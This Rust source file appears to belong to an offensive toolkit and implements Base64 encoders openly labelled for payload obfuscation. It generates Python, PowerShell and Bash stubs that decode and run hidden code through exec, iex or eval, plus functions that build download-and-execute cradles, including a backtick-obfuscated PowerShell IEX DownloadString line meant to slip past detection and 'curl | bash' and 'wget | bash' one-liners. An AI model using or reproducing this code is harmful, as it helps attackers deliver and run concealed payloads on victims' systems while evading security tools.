// Base64 Encoding Module
// Various Base64 encoding variants for payload obfuscation

use anyhow::{anyhow, Result};
use base64::{
    alphabet,
    engine::{general_purpose, DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig},
    Engine,
};

use super::{
    create_metadata, DecoderLanguage, Encoder, EncoderType, EncodingOptions, EncodingResult,
};

/// Base64 encoder variants
#[derive(Debug, Clone)]
pub enum Base64Variant {
    /// Standard Base64 (RFC 4648)
    Standard,
    /// URL-safe Base64
    UrlSafe,
    /// Custom alphabet Base64
    Custom,
    /// No padding Base64
    NoPadding,
}

/// Base64 encoder implementation
pub struct Base64Encoder {
    variant: Base64Variant,
}

impl Base64Encoder {
    /// Create standard Base64 encoder
    pub fn standard() -> Self {
        Self {
            variant: Base64Variant::Standard,
        }
    }

    /// Create URL-safe Base64 encoder
    pub fn url_safe() -> Self {
        Self {
            variant: Base64Variant::UrlSafe,
        }
    }

    /// Create custom alphabet Base64 encoder
    pub fn custom() -> Self {
        Self {
            variant: Base64Variant::Custom,
        }
    }

    /// Create no-padding Base64 encoder
    pub fn no_padding() -> Self {
        Self {
            variant: Base64Variant::NoPadding,
        }
    }

    /// Create custom engine from alphabet
    fn create_custom_engine(alphabet_str: &str) -> Result<GeneralPurpose> {
        if alphabet_str.len() != 64 {
            return Err(anyhow!(
                "Custom Base64 alphabet must be exactly 64 characters"
            ));
        }

        // Verify all characters are unique
        let mut chars: Vec<char> = alphabet_str.chars().collect();
        chars.sort();
        chars.dedup();
        if chars.len() != 64 {
            return Err(anyhow!("Custom Base64 alphabet must have 64 unique characters"));
        }

        let alphabet = alphabet::Alphabet::new(alphabet_str)
            .map_err(|e| anyhow!("Invalid alphabet: {}", e))?;
        let config = GeneralPurposeConfig::new()
            .with_encode_padding(true)
            .with_decode_padding_mode(DecodePaddingMode::Indifferent);

        Ok(GeneralPurpose::new(&alphabet, config))
    }

    /// Generate Python decoder stub
    fn generate_python_decoder(&self, encoded: &str, alphabet: Option<&str>) -> String {
        match self.variant {
            Base64Variant::Standard => {
                format!(
                    r#"import base64
# Base64 Standard Decoder
encoded = "{}"
decoded = base64.b64decode(encoded)
exec(decoded)
"#,
                    encoded
                )
            }
            Base64Variant::UrlSafe => {
                format!(
                    r#"import base64
# Base64 URL-Safe Decoder
encoded = "{}"
decoded = base64.urlsafe_b64decode(encoded)
exec(decoded)
"#,
                    encoded
                )
            }
            Base64Variant::Custom => {
                let alphabet = alphabet.unwrap_or("");
                format!(
                    r#"import base64
import string
# Base64 Custom Alphabet Decoder
std_alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'
custom_alphabet = "{}"
encoded = "{}"
# Translate from custom to standard
trans = str.maketrans(custom_alphabet, std_alphabet)
standard = encoded.translate(trans)
decoded = base64.b64decode(standard)
exec(decoded)
"#,
                    alphabet, encoded
                )
            }
            Base64Variant::NoPadding => {
                format!(
                    r#"import base64
# Base64 No-Padding Decoder
encoded = "{}"
# Add padding back
padding = 4 - len(encoded) % 4
if padding != 4:
    encoded += '=' * padding
decoded = base64.b64decode(encoded)
exec(decoded)
"#,
                    encoded
                )
            }
        }
    }

    /// Generate PowerShell decoder stub
    fn generate_powershell_decoder(&self, encoded: &str, _alphabet: Option<&str>) -> String {
        match self.variant {
            Base64Variant::Standard | Base64Variant::NoPadding => {
                format!(
                    r#"# Base64 Standard Decoder
$e="{}"
$d=[System.Convert]::FromBase64String($e)
iex([System.Text.Encoding]::ASCII.GetString($d))
"#,
                    encoded
                )
            }
            Base64Variant::UrlSafe => {
                format!(
                    r#"# Base64 URL-Safe Decoder
$e="{}"
$e=$e.Replace('-','+').Replace('_','/')
switch($e.Length%4){{2{{$e+='=='}}3{{$e+='='}}}}
$d=[System.Convert]::FromBase64String($e)
iex([System.Text.Encoding]::ASCII.GetString($d))
"#,
                    encoded
                )
            }
            Base64Variant::Custom => {
                format!(
                    r#"# Base64 Custom Decoder (requires manual alphabet substitution)
$e="{}"
# Implement custom alphabet translation as needed
$d=[System.Convert]::FromBase64String($e)
iex([System.Text.Encoding]::ASCII.GetString($d))
"#,
                    encoded
                )
            }
        }
    }

    /// Generate Bash decoder stub
    fn generate_bash_decoder(&self, encoded: &str, _alphabet: Option<&str>) -> String {
        match self.variant {
            Base64Variant::Standard | Base64Variant::NoPadding => {
                format!(
                    r#"#!/bin/bash
# Base64 Standard Decoder
encoded="{}"
decoded=$(echo "$encoded" | base64 -d)
eval "$decoded"
"#,
                    encoded
                )
            }
            Base64Variant::UrlSafe => {
                format!(
                    r#"#!/bin/bash
# Base64 URL-Safe Decoder
encoded="{}"
# Convert URL-safe to standard
encoded=$(echo "$encoded" | tr '_-' '/+')
# Add padding
mod=$((4 - ${{#encoded}} % 4))
if [ $mod -eq 1 ] || [ $mod -eq 2 ]; then
    encoded="${{encoded}}$(printf '=%.0s' $(seq 1 $mod))"
fi
decoded=$(echo "$encoded" | base64 -d)
eval "$decoded"
"#,
                    encoded
                )
            }
            _ => format!("# Custom Base64 requires Python decoder"),
        }
    }
}

impl Encoder for Base64Encoder {
    fn encoder_type(&self) -> EncoderType {
        match self.variant {
            Base64Variant::Standard => EncoderType::Base64Standard,
            Base64Variant::UrlSafe => EncoderType::Base64UrlSafe,
            Base64Variant::Custom => EncoderType::Base64Custom,
            Base64Variant::NoPadding => EncoderType::Base64NoPadding,
        }
    }

    fn encode(&self, data: &[u8], options: &EncodingOptions) -> Result<EncodingResult> {
        let (encoded, alphabet_used) = match self.variant {
            Base64Variant::Standard => {
                let encoded = general_purpose::STANDARD.encode(data);
                (encoded, None)
            }
            Base64Variant::UrlSafe => {
                let encoded = general_purpose::URL_SAFE.encode(data);
                (encoded, None)
            }
            Base64Variant::Custom => {
                let alphabet = options
                    .custom_alphabet
                    .as_ref()
                    .ok_or_else(|| anyhow!("Custom Base64 requires custom_alphabet option"))?;

                let engine = Self::create_custom_engine(alphabet)?;
                let encoded = engine.encode(data);
                (encoded, Some(alphabet.clone()))
            }
            Base64Variant::NoPadding => {
                let encoded = general_purpose::STANDARD_NO_PAD.encode(data);
                (encoded, None)
            }
        };

        // Apply multiple iterations if requested
        let mut final_encoded = encoded.clone();
        for _ in 1..options.iterations {
            final_encoded = match self.variant {
                Base64Variant::Standard => general_purpose::STANDARD.encode(&final_encoded),
                Base64Variant::UrlSafe => general_purpose::URL_SAFE.encode(&final_encoded),
                Base64Variant::Custom => {
                    if let Some(ref alphabet) = alphabet_used {
                        let engine = Self::create_custom_engine(alphabet)?;
                        engine.encode(&final_encoded)
                    } else {
                        general_purpose::STANDARD.encode(&final_encoded)
                    }
                }
                Base64Variant::NoPadding => general_purpose::STANDARD_NO_PAD.encode(&final_encoded),
            };
        }

        let encoded_bytes = final_encoded.as_bytes().to_vec();

        // Generate decoder stub
        let decoder_stub = if options.generate_decoder_stub {
            Some(match options.decoder_language {
                DecoderLanguage::Python => {
                    self.generate_python_decoder(&final_encoded, alphabet_used.as_deref())
                }
                DecoderLanguage::PowerShell => {
                    self.generate_powershell_decoder(&final_encoded, alphabet_used.as_deref())
                }
                DecoderLanguage::Bash => {
                    self.generate_bash_decoder(&final_encoded, alphabet_used.as_deref())
                }
                _ => self.generate_python_decoder(&final_encoded, alphabet_used.as_deref()),
            })
        } else {
            None
        };

        let metadata = create_metadata(
            data,
            &encoded_bytes,
            options.iterations,
            options.preserve_nulls,
            Vec::new(),
        );

        Ok(EncodingResult {
            encoded_data: encoded_bytes,
            encoded_string: Some(final_encoded),
            encoder_type: self.encoder_type(),
            decoder_stub,
            key_used: alphabet_used,
            iv_used: None,
            metadata,
        })
    }

    fn decode(&self, data: &[u8], options: &EncodingOptions) -> Result<Vec<u8>> {
        let input = std::str::from_utf8(data)
            .map_err(|e| anyhow!("Invalid UTF-8 in Base64 data: {}", e))?;

        match self.variant {
            Base64Variant::Standard => general_purpose::STANDARD
                .decode(input)
                .map_err(|e| anyhow!("Base64 decode error: {}", e)),
            Base64Variant::UrlSafe => general_purpose::URL_SAFE
                .decode(input)
                .map_err(|e| anyhow!("Base64 URL-safe decode error: {}", e)),
            Base64Variant::Custom => {
                let alphabet = options
                    .custom_alphabet
                    .as_ref()
                    .or(options.key.as_ref())
                    .ok_or_else(|| anyhow!("Custom Base64 requires custom_alphabet for decoding"))?;

                let engine = Self::create_custom_engine(alphabet)?;
                engine
                    .decode(input)
                    .map_err(|e| anyhow!("Custom Base64 decode error: {}", e))
            }
            Base64Variant::NoPadding => general_purpose::STANDARD_NO_PAD
                .decode(input)
                .map_err(|e| anyhow!("Base64 no-padding decode error: {}", e)),
        }
    }

    fn description(&self) -> &'static str {
        match self.variant {
            Base64Variant::Standard => "Standard Base64 encoding (RFC 4648)",
            Base64Variant::UrlSafe => "URL-safe Base64 encoding",
            Base64Variant::Custom => "Base64 encoding with custom alphabet",
            Base64Variant::NoPadding => "Base64 encoding without padding",
        }
    }
}

// ============================================================================
// Legacy functions for backward compatibility
// ============================================================================

/// Base64 encode (legacy function)
#[allow(dead_code)]
pub fn base64_encode(data: &str) -> String {
    general_purpose::STANDARD.encode(data)
}

/// Base64 decode (legacy function)
#[allow(dead_code)]
pub fn base64_decode(data: &str) -> Result<String, base64::DecodeError> {
    let decoded = general_purpose::STANDARD.decode(data)?;
    Ok(String::from_utf8_lossy(&decoded).to_string())
}

/// URL-safe Base64 encode
#[allow(dead_code)]
pub fn base64_url_encode(data: &[u8]) -> String {
    general_purpose::URL_SAFE.encode(data)
}

/// URL-safe Base64 decode
#[allow(dead_code)]
pub fn base64_url_decode(data: &str) -> Result<Vec<u8>> {
    general_purpose::URL_SAFE
        .decode(data)
        .map_err(|e| anyhow!("URL-safe Base64 decode error: {}", e))
}

/// Generate a PowerShell download and execute cradle
#[allow(dead_code)]
pub fn powershell_download_cradle(url: &str) -> String {
    format!(
        r#"IEX(New-Object Net.WebClient).DownloadString('{}')"#,
        url
    )
}

/// Generate a PowerShell download and execute cradle (obfuscated)
#[allow(dead_code)]
pub fn powershell_download_cradle_obfuscated(url: &str) -> String {
    format!(
        r#"$w=(N`ew-Ob`ject N`et.We`bCl`ient);$w.Do`wnl`oadS`tri`ng('{}')|ie`x"#,
        url
    )
}

/// Generate a curl download and execute for Linux
#[allow(dead_code)]
pub fn linux_download_cradle(url: &str) -> String {
    format!(r#"curl -s {} | bash"#, url)
}

/// Generate a wget download and execute for Linux
#[allow(dead_code)]
pub fn linux_wget_cradle(url: &str) -> String {
    format!(r#"wget -q -O - {} | bash"#, url)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_standard_base64() {
        let encoder = Base64Encoder::standard();
        let data = b"Hello, World!";
        let options = EncodingOptions::default();

        let result = encoder.encode(data, &options).unwrap();
        assert_eq!(result.encoded_string, Some("SGVsbG8sIFdvcmxkIQ==".to_string()));

        let decoded = encoder.decode(&result.encoded_data, &options).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_url_safe_base64() {
        let encoder = Base64Encoder::url_safe();
        let data = b"Test with special chars: +=/?";
        let options = EncodingOptions::default();

        let result = encoder.encode(data, &options).unwrap();
        assert!(result.encoded_string.is_some());
        // URL-safe should not contain + or /
        let encoded = result.encoded_string.unwrap();
        assert!(!encoded.contains('+') || encoded.contains('-'));

        let decoded = encoder.decode(&result.encoded_data, &options).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_custom_alphabet_base64() {
        let encoder = Base64Encoder::custom();
        let data = b"Custom alphabet test";

        // Use a shuffled alphabet
        let custom_alphabet = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";

        let options = EncodingOptions {
            custom_alphabet: Some(custom_alphabet.to_string()),
            ..Default::default()
        };

        let result = encoder.encode(data, &options).unwrap();
        assert!(result.encoded_string.is_some());

        let decoded = encoder.decode(&result.encoded_data, &options).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_no_padding_base64() {
        let encoder = Base64Encoder::no_padding();
        let data = b"No padding test";
        let options = EncodingOptions::default();

        let result = encoder.encode(data, &options).unwrap();
        let encoded = result.encoded_string.unwrap();
        // Should not contain padding characters
        assert!(!encoded.contains('='));

        let decoded = encoder.decode(&result.encoded_data, &options).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_multiple_iterations() {
        let encoder = Base64Encoder::standard();
        let data = b"Double encode test";
        let options = EncodingOptions {
            iterations: 2,
            ..Default::default()
        };

        let result = encoder.encode(data, &options).unwrap();
        assert_eq!(result.metadata.iterations, 2);

        // Verify we can decode (would need to decode twice)
        let once = encoder
            .decode(&result.encoded_data, &EncodingOptions::default())
            .unwrap();
        let twice = encoder
            .decode(&once, &EncodingOptions::default())
            .unwrap();
        assert_eq!(twice, data);
    }

    #[test]
    fn test_decoder_stub_generation() {
        let encoder = Base64Encoder::standard();
        let data = b"Stub test";
        let options = EncodingOptions {
            generate_decoder_stub: true,
            decoder_language: DecoderLanguage::Python,
            ..Default::default()
        };

        let result = encoder.encode(data, &options).unwrap();
        assert!(result.decoder_stub.is_some());
        assert!(result.decoder_stub.unwrap().contains("Base64 Standard Decoder"));
    }

    #[test]
    fn test_legacy_functions() {
        let original = "Legacy test";
        let encoded = base64_encode(original);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(original, decoded);
    }
}
